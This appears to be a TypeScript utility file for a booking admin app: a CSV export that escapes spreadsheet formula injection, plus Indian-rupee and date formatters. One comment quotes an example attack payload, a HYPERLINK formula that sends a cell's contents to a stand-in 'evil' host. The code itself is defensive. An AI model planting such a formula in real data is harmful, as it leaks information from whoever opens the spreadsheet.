type Row = Record<string, unknown>;

/** Cells a spreadsheet would evaluate as a formula rather than show as text. */
const FORMULA_START = /^[=+\-@\t\r]/;
/** A plain number is never a formula, so numeric columns stay numeric. */
const PLAIN_NUMBER = /^-?\d+(\.\d+)?$/;

function escapeCSV(value: unknown): string {
  if (value === null || value === undefined) return '';
  let str = String(value);
  // Excel and Sheets execute any cell that opens with = + - @ (or a tab/CR),
  // so a booking note of `=HYPERLINK("http://evil/?"&A1,"Invoice")` would run
  // when an admin opens the export. Names, mobiles and notes here are typed by
  // customers, so prefix those cells with an apostrophe to pin them as text.
  if (FORMULA_START.test(str) && !PLAIN_NUMBER.test(str)) str = `'${str}`;
  if (/[",\n\r]/.test(str)) return `"${str.replace(/"/g, '""')}"`;
  return str;
}

export function exportToCSV(rows: Row[], filename: string): void {
  if (!rows.length) return;
  const headers = Object.keys(rows[0]);
  const csvLines = [
    headers.map(escapeCSV).join(','),
    ...rows.map(row => headers.map(h => escapeCSV(row[h])).join(',')),
  ];
  // CRLF per RFC 4180: a quoted cell containing a newline is otherwise
  // indistinguishable from a row break for some readers.
  const blob = new Blob([csvLines.join('\r\n')], { type: 'text/csv;charset=utf-8;' });
  const url = URL.createObjectURL(blob);
  const link = document.createElement('a');
  link.href = url;
  link.download = `${filename}_${new Date().toISOString().slice(0, 10)}.csv`;
  document.body.appendChild(link);
  link.click();
  document.body.removeChild(link);
  URL.revokeObjectURL(url);
}

export function formatCurrency(amount: number): string {
  return new Intl.NumberFormat('en-IN', {
    style: 'currency',
    currency: 'INR',
    maximumFractionDigits: 0,
  }).format(amount);
}

export function formatDate(dateStr: string): string {
  return new Date(dateStr).toLocaleDateString('en-IN', {
    day: '2-digit', month: 'short', year: 'numeric',
  });
}

export function formatDateTime(dateStr: string): string {
  return new Date(dateStr).toLocaleString('en-IN', {
    day: '2-digit', month: 'short', year: 'numeric',
    hour: '2-digit', minute: '2-digit',
  });
}
